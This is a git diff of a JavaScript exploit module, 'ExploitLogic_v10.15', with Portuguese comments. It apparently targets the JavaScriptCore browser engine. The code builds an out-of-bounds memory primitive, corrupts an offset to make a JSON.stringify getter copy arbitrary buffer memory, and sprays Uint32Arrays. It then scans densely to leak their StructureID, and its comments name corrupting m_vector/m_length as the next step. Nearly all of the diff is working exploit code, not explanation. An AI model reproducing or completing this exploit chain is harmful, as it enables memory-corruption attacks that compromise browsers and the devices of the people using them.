@@ -14,27 +14,28 @@ import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';
 // ============================================================
 // DEFINIÇÕES DE CONSTANTES E VARIÁVEIS GLOBAIS
 // ============================================================
-const FNAME_MAIN = "ExploitLogic_v10.14"; // Versão atualizada
+const FNAME_MAIN = "ExploitLogic_v10.15";
 
-const GETTER_PROPERTY_NAME_COPY = "AAAA_GetterForMemoryCopy_v10_14";
-const PLANT_OFFSET_0x6C = 0x6C; // Offset onde plantamos o valor que influencia a "mágica"
+const GETTER_PROPERTY_NAME_COPY = "AAAA_GetterForMemoryCopy_v10_15";
+const PLANT_OFFSET_0x6C_FOR_COPY_SRC_DWORD = 0x6C;
 const INTERMEDIATE_PTR_OFFSET_0x68 = 0x68;
 const CORRUPTION_OFFSET_TRIGGER = 0x70;
 const CORRUPTION_VALUE_TRIGGER = new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF);
 const TARGET_COPY_DEST_OFFSET_IN_OOB = 0x180;
 
-let getter_copy_called_flag_v10_14 = false;
+let getter_copy_called_flag_v10_15 = false;
 
+// !!!!! ESTE VALOR SERÁ O ALVO DA DESCOBERTA DESTE SCRIPT !!!!!
 let EXPECTED_UINT32ARRAY_STRUCTURE_ID = null;
-const PLACEHOLDER_SID_UINT32ARRAY = 0xBADBAD00 | 42; // Novo placeholder
+const PLACEHOLDER_SID_UINT32ARRAY = 0xBADBAD00 | 43; // Novo placeholder
 
 
 // ============================================================
-// PRIMITIVA DE CÓPIA DE MEMÓRIA (readFromOOBOffsetViaCopy_v10_14)
+// PRIMITIVA DE CÓPIA DE MEMÓRIA (VALIDADA na v10.9/10.14)
 // ============================================================
-async function readFromOOBOffsetViaCopy_v10_14(dword_source_offset_to_read_from) {
-    const FNAME_PRIMITIVE = `${FNAME_MAIN}.readFromOOBOffsetViaCopy_v10_14`;
-    getter_copy_called_flag_v10_14 = false;
+async function readFromOOBOffsetViaCopy_v10_15(dword_source_offset_to_read_from) {
+    const FNAME_PRIMITIVE = `${FNAME_MAIN}.readFromOOBOffsetViaCopy_v10_15`;
+    getter_copy_called_flag_v10_15 = false;
 
     if (!oob_array_buffer_real || !oob_dataview_real) {
         await triggerOOB_primitive();
@@ -42,13 +43,12 @@ async function readFromOOBOffsetViaCopy_v10_14(dword_source_offset_to_read_from)
     }
     oob_write_absolute(TARGET_COPY_DEST_OFFSET_IN_OOB, AdvancedInt64.Zero, 8);
 
-    // Plantar o dword_source_offset_to_read_from como a parte baixa do QWORD em PLANT_OFFSET_0x6C.
     const value_to_plant_at_0x6c = new AdvancedInt64(dword_source_offset_to_read_from, 0);
-    oob_write_absolute(PLANT_OFFSET_0x6C, value_to_plant_at_0x6c, 8); // USA A CONSTANTE CORRETA
+    oob_write_absolute(PLANT_OFFSET_0x6C_FOR_COPY_SRC_DWORD, value_to_plant_at_0x6c, 8);
 
     const getterObjectForCopy = {
         get [GETTER_PROPERTY_NAME_COPY]() {
-            getter_copy_called_flag_v10_14 = true;
+            getter_copy_called_flag_v10_15 = true;
             try {
                 const qword_at_0x68 = oob_read_absolute(INTERMEDIATE_PTR_OFFSET_0x68, 8);
                 const effective_read_offset = qword_at_0x68.high();
@@ -61,31 +61,34 @@ async function readFromOOBOffsetViaCopy_v10_14(dword_source_offset_to_read_from)
                         oob_write_absolute(TARGET_COPY_DEST_OFFSET_IN_OOB, AdvancedInt64.Zero, 8);
                     }
                 } else {
-                     logS3(`  [GETTER ${GETTER_PROPERTY_NAME_COPY}] ERRO MÁGICA: effective_read_offset (${toHex(effective_read_offset)}) != dword_source_offset (${toHex(dword_source_offset_to_read_from)})! Qword@0x68 era ${qword_at_0x68.toString(true)}`, "critical", FNAME_PRIMITIVE);
+                    // Este log pode ser muito verboso durante um scan, remover se necessário
+                    // logS3(`  [GETTER ${GETTER_PROPERTY_NAME_COPY}] ERRO MÁGICA: effective_read_offset (${toHex(effective_read_offset)}) != dword_source_offset (${toHex(dword_source_offset_to_read_from)})! Qword@0x68 era ${qword_at_0x68.toString(true)}`, "critical", FNAME_PRIMITIVE);
                     oob_write_absolute(TARGET_COPY_DEST_OFFSET_IN_OOB, new AdvancedInt64(0xBAD68BAD, 0xBAD68BAD), 8);
                 }
             } catch (e_getter) {
-                logS3(`  [GETTER ${GETTER_PROPERTY_NAME_COPY}] Erro interno: ${e_getter.message}`, "error", FNAME_PRIMITIVE);
                 try {oob_write_absolute(TARGET_COPY_DEST_OFFSET_IN_OOB, new AdvancedInt64(0xDEADDEAD,0xBADBAD), 8); } catch(e){}
             }
-            return "getter_copy_v10_14_done";
+            return "getter_copy_v10_15_done";
         }
     };
 
     oob_write_absolute(CORRUPTION_OFFSET_TRIGGER, CORRUPTION_VALUE_TRIGGER, 8);
-    await PAUSE_S3(10);
+    await PAUSE_S3(5);
 
     try { JSON.stringify(getterObjectForCopy); } catch (e) { /* Ignora */ }
 
-    if (!getter_copy_called_flag_v10_14) { return null; }
+    if (!getter_copy_called_flag_v10_15) { return null; }
     return oob_read_absolute(TARGET_COPY_DEST_OFFSET_IN_OOB, 8);
 }
 
 // ============================================================
 // FUNÇÃO PARA LER StructureID USANDO A PRIMITIVA DE CÓPIA
 // ============================================================
-async function getStructureIDFromCopiedQWORD() { // Renomeada para clareza, pois lê do destino da cópia
-    const copied_qword = oob_read_absolute(TARGET_COPY_DEST_OFFSET_IN_OOB, 8);
+async function getStructureIDFromOOB_v10_15(offset_of_jscell_in_oob) {
+    if (!oob_array_buffer_real || offset_of_jscell_in_oob < 0 || offset_of_jscell_in_oob >= oob_array_buffer_real.byteLength - 8) {
+        return null;
+    }
+    const copied_qword = await readFromOOBOffsetViaCopy_v10_15(offset_of_jscell_in_oob);
     if (copied_qword &&
         !(copied_qword.low() === 0xBADBAD && copied_qword.high() === 0xDEADDEAD) &&
         !(copied_qword.low() === 0xBAD68BAD && copied_qword.high() === 0xBAD68BAD) ) {
@@ -95,11 +98,11 @@ async function getStructureIDFromCopiedQWORD() { // Renomeada para clareza, pois
 }
 
 // ============================================================
-// FUNÇÃO PRINCIPAL DE INVESTIGAÇÃO (v10.14)
+// FUNÇÃO PRINCIPAL DE INVESTIGAÇÃO (v10.15 - Foco na Descoberta de SID)
 // ============================================================
 export async function sprayAndInvestigateObjectExposure() {
-    const FNAME_CURRENT_TEST = `${FNAME_MAIN}.investigateCorruptionLeak_v10.14`;
-    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Investigando Vazamento de Ponteiro para 0x6C/0x68 via Corrupção ---`, "test", FNAME_CURRENT_TEST);
+    const FNAME_CURRENT_TEST = `${FNAME_MAIN}.discoverSIDWithValidatedCopy_v10.15`;
+    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Descoberta de SID de Uint32Array com Primitiva Validada ---`, "test", FNAME_CURRENT_TEST);
 
     let sprayedU32Arrays = [];
 
@@ -107,80 +110,93 @@ export async function sprayAndInvestigateObjectExposure() {
         await triggerOOB_primitive();
         if (!oob_array_buffer_real) { throw new Error("OOB Init falhou."); }
         logS3("Ambiente OOB inicializado.", "info", FNAME_CURRENT_TEST);
+        logS3(`   OBJETIVO: Encontrar o StructureID de Uint32Array. Placeholder atual: ${toHex(PLACEHOLDER_SID_UINT32ARRAY)}`, "info", FNAME_CURRENT_TEST);
 
-        // 1. Limpar offsets de interesse e pulverizar objetos
-        logS3("PASSO 1: Limpando offsets de interesse e pulverizando Uint32Arrays...", "info", FNAME_CURRENT_TEST);
-        oob_write_absolute(PLANT_OFFSET_0x6C, new AdvancedInt64(0xCAFEF00D, 0xCAFEF00D), 8); // Limpa 0x6C com um padrão
-        oob_write_absolute(INTERMEDIATE_PTR_OFFSET_0x68, new AdvancedInt64(0xBABEBEEF, 0xBABEBEEF), 8); // Limpa 0x68 com um padrão
-        oob_write_absolute(TARGET_COPY_DEST_OFFSET_IN_OOB, AdvancedInt64.Zero, 8); // Limpa destino da cópia
-
-        const NUM_U32_SPRAY = 200;
+        // PASSO 1: Pulverizar Uint32Arrays e tentar encontrar seus StructureIDs
+        logS3("PASSO 1: Pulverizando Uint32Arrays para descoberta de SID...", "info", FNAME_CURRENT_TEST);
+        const NUM_U32_SPRAY = 300;
+        const U32_SPRAY_LEN_BASE = 4;
+        sprayedU32Arrays = [];
         for (let i = 0; i < NUM_U32_SPRAY; i++) {
-            sprayedU32Arrays.push(new Uint32Array(8 + (i % 3)));
+            sprayedU32Arrays.push(new Uint32Array(U32_SPRAY_LEN_BASE + (i % 8)));
         }
         logS3(`  ${sprayedU32Arrays.length} Uint32Arrays pulverizados.`, "info", FNAME_CURRENT_TEST);
-        await PAUSE_S3(300);
+        await PAUSE_S3(500);
 
-        // 2. Acionar a primitiva de cópia.
-        //    A corrupção em 0x70 é acionada DENTRO de readFromOOBOffsetViaCopy_v10_14.
-        //    Essa corrupção é o que PODE fazer com que um ponteiro vaze para 0x6C.low,
-        //    que então se torna 0x68.high, que é o offset de leitura da primitiva de cópia.
-        //    Não passamos um offset fonte para readFromOOBOffsetViaCopy_v10_14 porque
-        //    o valor que plantamos em 0x6C (primeiro arg de AdvancedInt64) é o que queremos
-        //    que se torne o 0x68.high().
-        //    A questão é: o que a corrupção em 0x70 faz com o valor original em 0x6C.low?
+        let found_sids_map = {};
+        const SCAN_START = 0x080; // Começar um pouco mais cedo (128 bytes)
+        const SCAN_END = Math.min(0x7F00, oob_array_buffer_real.byteLength - 0x20); // Escanear quase todo o buffer de 32KB
+        const SCAN_STEP_SID = 0x04; // Scan MUITO denso (a cada 4 bytes)
 
-        logS3("PASSO 2: Acionando primitiva de cópia...", "info", FNAME_CURRENT_TEST);
-        logS3("   Objetivo: Ver se a corrupção em 0x70 vaza um ponteiro útil para 0x6C.low,", "info", FNAME_CURRENT_TEST);
-        logS3("   que então se torna 0x68.high, que o getter usa como offset de leitura.", "info", FNAME_CURRENT_TEST);
+        logS3(`  Escaneando de ${toHex(SCAN_START)} a ${toHex(SCAN_END)} com passo ${toHex(SCAN_STEP_SID)} por SIDs... (PODE SER EXTREMAMENTE LENTO!)`, "warn", FNAME_CURRENT_TEST);
+        let sids_found_in_scan = 0;
+        const known_ab_sid = JSC_OFFSETS.ArrayBuffer.KnownStructureIDs.ArrayBuffer_STRUCTURE_ID;
 
-        // Para este teste, vamos ver o que é lido se não plantarmos nada significativo em 0x6C antes da corrupção.
-        // A primitiva readFromOOBOffsetViaCopy_v10_14 plantará seu argumento (dword_source_offset_to_read_from) em 0x6C.low.
-        // Vamos passar um offset baixo e conhecido para que, se a corrupção NÃO vazar nada para 0x6C.low,
-        // saibamos de onde a leitura está vindo.
-        const offset_para_teste_primitiva = 0x250; // Um offset dentro do buffer OOB
-        oob_write_absolute(offset_para_teste_primitiva, new AdvancedInt64(0xABCDABCD, 0x12341234), 8); // Escreve um valor conhecido lá
-        logS3(`   Valor de teste ${toHex(0x12341234ABCDABCDn)} escrito em ${toHex(offset_para_teste_primitiva)}.`, "info", FNAME_CURRENT_TEST);
+        for (let offset = SCAN_START; offset < SCAN_END; offset += SCAN_STEP_SID) {
+            let sid = await getStructureIDFromOOB_v10_15(offset); // Usa a primitiva atualizada
+            if (sid !== null && sid !== 0 && sid !== 0xFFFFFFFF) {
+                if (typeof known_ab_sid === 'number' && (sid & 0xFFFFFF00) === (known_ab_sid & 0xFFFFFF00)) {
+                    continue; 
+                }
+                // Evitar log de padrões de preenchimento comuns se eles aparecerem como SID
+                if ((sid & 0xFFFF0000) === 0xCAFE0000 || (sid & 0xFF000000) === 0xFACE0000 || (sid & 0xFFFF0000) === 0xBADB0000) {
+                    continue;
+                }
+                
+                found_sids_map[sid] = (found_sids_map[sid] || 0) + 1;
+                sids_found_in_scan++;
 
-        await readFromOOBOffsetViaCopy_v10_14(offset_para_teste_primitiva);
-
-        // 3. Analisar o que foi copiado e os valores em 0x6C e 0x68
-        const val_at_0x6C_post_corruption = oob_read_absolute(PLANT_OFFSET_0x6C, 8);
-        const val_at_0x68_post_corruption = oob_read_absolute(INTERMEDIATE_PTR_OFFSET_0x68, 8);
-        const data_copied_to_dest = oob_read_absolute(TARGET_COPY_DEST_OFFSET_IN_OOB, 8);
-
-        logS3("PASSO 3: Analisando resultados...", "info", FNAME_CURRENT_TEST);
-        logS3(`  Valor em 0x6C (PLANT_OFFSET_0x6C) APÓS corrupção: ${val_at_0x6C_post_corruption.toString(true)}`, "leak", FNAME_CURRENT_TEST);
-        logS3(`    (Esperamos que .low() seja ${toHex(offset_para_teste_primitiva)} se não houve vazamento para 0x6C pela corrupção em 0x70)`, "info", FNAME_CURRENT_TEST);
-        logS3(`  Valor em 0x68 (INTERMEDIATE_PTR_OFFSET_0x68) APÓS corrupção: ${val_at_0x68_post_corruption.toString(true)}`, "leak", FNAME_CURRENT_TEST);
-        logS3(`    (Esperamos que .high() seja ${toHex(offset_para_teste_primitiva)} se não houve vazamento)`, "info", FNAME_CURRENT_TEST);
-        logS3(`  Dados copiados para ${toHex(TARGET_COPY_DEST_OFFSET_IN_OOB)}: ${data_copied_to_dest.toString(true)}`, "leak", FNAME_CURRENT_TEST);
-        logS3(`    (Esperamos que seja igual a oob_buffer[${toHex(offset_para_teste_primitiva)}] se não houve vazamento)`, "info", FNAME_CURRENT_TEST);
-
-
-        let effective_read_offset_used_by_getter = val_at_0x68_post_corruption.high();
-        logS3(`  Offset efetivo de leitura que FOI USADO pelo getter (de 0x68.high): ${toHex(effective_read_offset_used_by_getter)}`, "info", FNAME_CURRENT_TEST);
-
-        if (data_copied_to_dest.equals(new AdvancedInt64(0xABCDABCD, 0x12341234))) {
-            logS3("    !!!! VALIDAÇÃO: Primitiva de cópia leu do offset de teste (${toHex(offset_para_teste_primitiva)}) como esperado. !!!!", "good", FNAME_CURRENT_TEST);
-            logS3("       Isso significa que a corrupção em 0x70 NÃO alterou 0x6C.low para um ponteiro vazado desta vez.", "info", FNAME_CURRENT_TEST);
-            document.title = "Cópia OK, Sem Leak em 0x6C";
-        } else if (!data_copied_to_dest.isZero() && !(data_copied_to_dest.low() === 0xBADBAD && data_copied_to_dest.high() === 0xDEADDEAD) && !(data_copied_to_dest.low() === 0xBAD68BAD && data_copied_to_dest.high() === 0xBAD68BAD) ) {
-            logS3("    !!!! DADOS NÃO NULOS/ERRO FORAM COPIADOS, e DIFERENTES do valor de teste !!!!", "vuln", FNAME_CURRENT_TEST);
-            logS3(`      Isso sugere que o effective_read_offset_used_by_getter (${toHex(effective_read_offset_used_by_getter)}) veio de um vazamento para 0x6C.low!`, "vuln", FNAME_CURRENT_TEST);
-            document.title = `LEAK em ${toHex(effective_read_offset_used_by_getter)}?`;
-
-            const potential_sid = data_copied_to_dest.low();
-            logS3(`      StructureID potencial vazado (da cópia): ${toHex(potential_sid)}`, "leak", FNAME_CURRENT_TEST);
-            if (potential_sid !== 0 && potential_sid !== 0xFFFFFFFF) {
-                 EXPECTED_UINT32ARRAY_STRUCTURE_ID = potential_sid;
-                 logS3(`        !!!! ATRIBUÍDO ${toHex(EXPECTED_UINT32ARRAY_STRUCTURE_ID)} a EXPECTED_UINT32ARRAY_STRUCTURE_ID !!!!`, "vuln", FNAME_CURRENT_TEST);
-                 logS3("        >>>> VERIFIQUE SE ESTE É UM SID VÁLIDO E ATUALIZE A CONSTANTE NO TOPO DO ARQUIVO! <<<<", "critical", FNAME_CURRENT_TEST);
-                 document.title = `SID VAZADO? ${toHex(EXPECTED_UINT32ARRAY_STRUCTURE_ID)}`;
+                if (found_sids_map[sid] <= 5) { // Loga as primeiras 5 ocorrências de um novo SID potencial
+                     logS3(`    Offset ${toHex(offset)}: SID Potencial = ${toHex(sid)} (Contagem: ${found_sids_map[sid]})`, "leak", FNAME_CURRENT_TEST);
+                }
             }
-        } else {
-            logS3("    Dados copiados foram zero ou um valor de erro. Investigar o effective_read_offset.", "warn", FNAME_CURRENT_TEST);
+            // Log de progresso menos frequente para scan denso
+            if (offset > SCAN_START && offset % (SCAN_STEP_SID * 1024) === 0) { // A cada ~4KB
+                logS3(`    Scan em ${toHex(offset)}... SIDs únicos candidatos: ${Object.keys(found_sids_map).length}`, "info", FNAME_CURRENT_TEST);
+                await PAUSE_S3(10); 
+            }
         }
+        logS3(`  Scan concluído. Total de ${sids_found_in_scan} SIDs potenciais (filtrados) encontrados.`, "info", FNAME_CURRENT_TEST);
+
+        let sorted_sids = Object.keys(found_sids_map).map(k => parseInt(k)).sort((a,b) => found_sids_map[b] - found_sids_map[a]);
+
+        logS3("  Frequência dos SIDs encontrados (top 10 mais frequentes, filtrados):", "info", FNAME_CURRENT_TEST);
+        let displayed_sids_count = 0;
+        let most_frequent_sid_val = null; 
+        let max_freq = 0;
+
+        for(let i=0; i < sorted_sids.length; i++) {
+            const sid_val = sorted_sids[i];
+            const current_freq = found_sids_map[sid_val];
+            // Filtro adicional para SIDs que parecem mais "reais"
+            if (current_freq > 1 && sid_val > 0x100000 && sid_val < 0x7FFFFFFF) { // Ex: IDs entre ~1MB e ~2GB
+                if (displayed_sids_count < 10) {
+                    logS3(`    - SID: ${toHex(sid_val)}  Contagem: ${current_freq}`, "info", FNAME_CURRENT_TEST);
+                    displayed_sids_count++;
+                }
+                if (current_freq > max_freq) {
+                    max_freq = current_freq;
+                    most_frequent_sid_val = sid_val;
+                }
+            }
+        }
+        
+        if (most_frequent_sid_val !== null && max_freq > Math.min(NUM_U32_SPRAY / 25, 5)) { // Exigir uma frequência mínima
+            EXPECTED_UINT32ARRAY_STRUCTURE_ID = most_frequent_sid_val;
+            logS3(`  !!!! StructureID MAIS FREQUENTE (candidato para Uint32Array): ${toHex(EXPECTED_UINT32ARRAY_STRUCTURE_ID)} (contagem: ${max_freq}) !!!!`, "vuln", FNAME_CURRENT_TEST);
+            logS3("    >>>> COPIE ESTE VALOR PARA A CONSTANTE EXPECTED_UINT32ARRAY_STRUCTURE_ID NO TOPO DO ARQUIVO! <<<<", "critical", FNAME_CURRENT_TEST);
+            document.title = `U32 SID? ${toHex(EXPECTED_UINT32ARRAY_STRUCTURE_ID)}`;
+        } else {
+            logS3("  Nenhum candidato a StructureID de Uint32Array suficientemente proeminente/confiável encontrado.", "warn", FNAME_CURRENT_TEST);
+            EXPECTED_UINT32ARRAY_STRUCTURE_ID = PLACEHOLDER_SID_UINT32ARRAY;
+        }
+        logS3(`EXPECTED_UINT32ARRAY_STRUCTURE_ID (final para este run): ${toHex(EXPECTED_UINT32ARRAY_STRUCTURE_ID)}`, "info", FNAME_CURRENT_TEST);
+
+        // --- PASSO FUTURO: Usar o SID descoberto para corromper m_vector/m_length ---
+        if (EXPECTED_UINT32ARRAY_STRUCTURE_ID !== PLACEHOLDER_SID_UINT32ARRAY) {
+            logS3(`  Próximo passo: Usar SID ${toHex(EXPECTED_UINT32ARRAY_STRUCTURE_ID)} para corromper um Uint32Array real.`, "info", FNAME_CURRENT_TEST);
+        }
+
 
     } catch (e) {
         logS3(`ERRO CRÍTICO em ${FNAME_CURRENT_TEST}: ${e.message}`, "critical", FNAME_CURRENT_TEST);
